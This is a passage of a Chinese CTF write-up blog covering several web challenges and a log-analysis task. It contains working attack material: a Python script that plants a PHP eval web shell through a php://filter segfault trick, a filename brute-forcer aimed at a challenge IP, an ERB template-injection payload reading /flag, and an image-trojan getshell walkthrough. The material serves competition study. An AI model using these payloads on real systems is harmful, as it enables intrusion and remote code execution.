class="keyword">if</span> (<span class="variable">$filename</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$filename</span> !== <span class="string">&#x27;..&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="string">&#x27;php&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$phpFiles</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$phpFiles</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$phpFiles</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="variable">$lastFour</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">4</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">4</span>) : <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$lastFour</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;请传入有效的file参数&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAllowedFile</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filterPrefix</span> = <span class="string">&#x27;php://filter/string.strip_tags/resource=&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="variable">$filterPrefix</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$resourcePath</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$filterPrefix</span>));</span><br><span class="line">        <span class="variable">$resourceRealPath</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$resourcePath</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resourceRealPath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmpBaseDir</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;/tmp&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$allowedIndexPhp</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$resourceRealPath</span>, <span class="variable">$tmpBaseDir</span>) === <span class="number">0</span> || <span class="variable">$resourceRealPath</span> === <span class="variable">$allowedIndexPhp</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$realPath</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$realPath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$tmpBaseDir</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;/tmp&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$realPath</span>, <span class="variable">$tmpBaseDir</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$allowedIndexPhp</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$realPath</span> === <span class="variable">$allowedIndexPhp</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAllowedFile</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;file参数不合法&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$includeResult</span> = @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$includeResult</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;无法包含文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">请传入有效的file参数</span><br></pre></td></tr></table></figure>
<p>​		存在 <code>$filterPrefix = 'php://filter/string.strip_tags/resource=';</code> ，依稀记得<strong> BUUOJ-[NPUCTF2020] ezinclude 1</strong> 这个题里有一个这个伪协议，有个特性：</p>
<blockquote>
<p>在上传文件时，如果出现  <code>Segment Fault</code>  ，那么上传的临时文件不会被删除。这里的上传文件需要说明一下，一般认为，上传文件需要对应的功能点，但实际上，无论是否有文件上传的功能点，只要 HTTP 请求中存在文件，那么就会被保存为临时文件，当前 HTTP 请求处理完成后，垃圾回收机制会自动删除临时文件。</p>
<p>使  <code>php</code>  陷入死循环直，产生  <code>Segment Fault</code>  的方法：（具体原理未找到，如果有大佬清楚，请告知，感谢。）</p>
<ul>
<li>使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;php://filter/string.strip_tags/resource=文件</span><br></pre></td></tr></table></figure>
<ul>
<li>使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;php://filter/convert.quoted-printable-encode/resource=文件</span><br></pre></td></tr></table></figure>
<ul>
<li>函数要求</li>
<li><code>file</code></li>
<li><code>file_get_contents</code></li>
<li><code>readfile</code></li>
</ul>
</blockquote>
<p>​		所以直接 PHP LFI 包含临时文件＋string.strip_tags 过滤器导致出现 php segment fault</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO <span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://8.153.93.57:30372/?file=php://filter/string.strip_tags/resource=index.php&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>​		之后用 <code>?file=tmp</code> ，这里功能是扫描临时文件目录，输出 <code>DAyj</code> ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$phpFiles</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="variable">$lastFour</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">4</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">4</span>) : <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$lastFour</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		根据这里，可以知道，当输出长度高于 4 的时候输出后四位，那么，这里应该是两位是未知的 <code>php??DAyj</code> ，那么就得爆破</p>
<p>​		最后爆破出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL的基础部分（??为待爆破位置）</span></span><br><span class="line">base_url = <span class="string">&quot;http://8.153.93.57:30372/?file=/tmp/php&#123;&#125;&#123;&#125;DAyj&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破字符集：数字 + 大写字母 + 小写字母</span></span><br><span class="line">chars = string.digits + string.ascii_uppercase + string.ascii_lowercase</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求头（根据提供的数据包构造，修正换行语法问题）</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;BEEFHOOK=v9l9riSiUl5aAaBp1TD92APnVIe94w8whQSHqUW1p9KX43aUihRWqBASlt608WnLT6N4BfmKPSczQ0IN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0, i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST数据</span></span><br><span class="line">data = <span class="string">&quot;cmd=phpinfo();&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功标识（phpinfo()的特征内容，可根据实际情况调整）</span></span><br><span class="line">success_flag = <span class="string">&quot;PHP Version&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的两位组合</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> chars:</span><br><span class="line">    <span class="keyword">for</span> c2 <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="comment"># 构造完整URL</span></span><br><span class="line">        target_url = base_url.<span class="built_in">format</span>(c1, c2)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;尝试: <span class="subst">&#123;target_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送POST请求（超时时间10秒）</span></span><br><span class="line">            response = requests.post(</span><br><span class="line">                url=target_url,</span><br><span class="line">                headers=headers,</span><br><span class="line">                data=data,</span><br><span class="line">                timeout=<span class="number">10</span>,</span><br><span class="line">                verify=<span class="literal">False</span>  <span class="comment"># 忽略SSL证书验证（如果需要）</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查响应中是否包含成功标识</span></span><br><span class="line">            <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 爆破成功！正确组合: <span class="subst">&#123;c1&#125;</span><span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 响应内容片段: <span class="subst">&#123;response.text[:<span class="number">500</span>]&#125;</span>&quot;</span>)  <span class="comment"># 输出部分响应</span></span><br><span class="line">                exit()  <span class="comment"># 找到后退出</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 避免请求过于频繁，间隔0.5秒（可根据目标调整）</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[!] 所有组合尝试完毕，未找到匹配结果&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[!] 爆破成功！正确组合: jL</span><br><span class="line">[!] 响应内容片段: &lt;code&gt;&lt;span style=&quot;color: <span class="params">#0</span>00000&quot;&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>000BB&quot;&gt;<span class="built_in">$</span>file<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;=<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>000BB&quot;&gt;<span class="built_in">$</span><span class="built_in">_</span>GET&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#</span>DD0000&quot;&gt;&#x27;file&#x27;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;]<span class="built_in">&amp;</span>nbsp;??<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		成功 RCE，之后就是 RCE 读取文件了：</p>
<h2 id="红宝石的恶作剧复现先记录下来细看"><a class="markdownIt-Anchor" href="#红宝石的恶作剧复现先记录下来细看">#</a> <strong>红宝石的恶作剧</strong>（复现，先记录下来，细看）</h2>
<blockquote>
<p>ez_ssti</p>
</blockquote>
<p>​		<strong>WP 没看懂，先记录下来，之后研究下</strong></p>
<p>​		输入 <code>1+1</code>  返回 2，但是输入 <code>&#123;&#123;1*1&#125;&#125;</code>  就报错了，wp 里说这个是 Ruby 环境，存在 ERB 模板注入漏洞，所以用 <code>File.read('/flag'),返回fakeflag</code>  读取 flag，但是返回了个假的 flag： <code>Hello, HECTF&#123;TH1S_lS_a_FAKE_flag&#125;!</code> ，过滤的东西通过动态常量绕过， <code>Object.const_get(&quot;File&quot;).read(&quot;/flag&quot;)</code> 。</p>
<h2 id="数据管理系统复现"><a class="markdownIt-Anchor" href="#数据管理系统复现">#</a> <strong>数据管理系统</strong>（复现）</h2>
<blockquote>
<p>开发小哥为了下班粗心 buff 叠满，够领导拿着板子追着揍半条街。</p>
<p><strong>提示 1</strong>1.file 参数存在日志泄露</p>
<p><strong>提示 2</strong>2. 图片包含</p>
</blockquote>
<p>​		Hint1 里说的是 file 参数存在日志泄露，结合主页的这里，推测可以通过这个读取到日志文件，可以先去读一下日志文件：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/47bd96a49783406c867b80374e91210e.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		中间件是 Nginx，然后随便登录下发现登录方式是 GET 并且没加密： <code>/?username=admin&amp;password=asd</code> ，可以读取下 Nginx 的日志文件，来获取账号密码，先用 GET 方式读下： <code>?file=/var/log/nginx/access.log</code> ，并搜搜下 = admin：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/63f27a7bfc5f447fbb1523ab32a71d4b.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		账号密码有了，但是可能有干扰，得一个个试试，最后试出来这个对了 <code>admin/bdsfasuaosdah42134223829@#!</code> 。</p>
<p>​		在个人资料那里找到了文件上传的点，做一个图片马，整一个比较小的 png 图片，然后用 winhex 修改里面的一些内容的十六进制为木马的文本对应的十六进制，能绕过 getimagesize 校验：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/29ae5590ef36472bac51e54860908de7.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		在解压调试界面，分析前端 html，有个这个：<br>
<img data-src="https://i-blog.csdnimg.cn/direct/655bce2bb79248e38ab7e63d5af2273f.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		解压调试下面有个地方写了个 png 文件，那个就是我们传上去的木马文件，不过为啥最后一步的目录是这样的不知道，后面环境关了没来得及写，晚上宿舍断电，复现一半电脑没电关机了，第二天起来环境没了，所以贴一个 wp 里的截图：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/d2c9054d7613419bab1922ae86994eba.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		最后尝试包含文件，getshell</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/93ba1ecd7cb848e5a7985144e40151a4.png#pic_center" alt="在这里插入图片描述"></p>
<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn：</h1>
<h2 id="nc一下~"><a class="markdownIt-Anchor" href="#nc一下~">#</a> <strong>nc 一下～</strong></h2>
<blockquote>
<p>小明从系统后台中发现了一段有问题的日志，你能从中找到奇怪点并且消除吗？</p>
</blockquote>
<p>​		nc 一下得到日志：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01 HTTP/1.1&quot; 301 578 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01/ HTTP/1.1&quot; 302 336 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1049 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:31 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:31 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1058 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:33 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:33 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1062 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:35 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:35 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1065 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:36 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:36 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1068 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:38 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:38 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1070 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:47 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:47 +0800] &quot;GET /01/index.php HTTP/1.1&quot; 200 3033 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:57 +0800] &quot;GET /01/data/upload/ HTTP/1.1&quot; 200 1747 &quot;http://192.168.220.132/01/index.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:14 +0800] &quot;POST /01/data/upload/ HTTP/1.1&quot; 200 1805 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:18 +0800] &quot;GET /01/data/upload/upd0te.php HTTP/1.1&quot; 200 512 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:23 +0800] &quot;GET /01/phpinfo.php HTTP/1.1&quot; 200 25051 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:30 +0800] &quot;GET /01/logout.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:30 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1072 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line"></span><br><span class="line">请找到黑客的操作[ 提交答案：病毒上传的时间+病毒名称 ]：</span><br></pre></td></tr></table></figure>
<p>​		经过分析，发现文件上传漏洞，且相关日志是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:57 +0800] &quot;GET /01/data/upload/ HTTP/1.1&quot; 200 1747 &quot;http://192.168.220.132/01/index.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:14 +0800] &quot;POST /01/data/upload/ HTTP/1.1&quot; 200 1805 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:18 +0800] &quot;GET /01/data/upload/upd0te.php HTTP/1.1&quot; 200 512 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br></pre></td></tr></table></figure>
<p>​		第二条很显然，POST 传输文件，第三条直接出现了访问木马的情况，那么第三条就是木马（后面全是 logout 和 login 操作，所以估计就是这两条）那么输入 <code>02/Jul/2024:18:54:14+upd0te.php</code>  通过第一关，第二关是个游戏，没搞懂什么 sum 逻辑，但还是不小心过了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 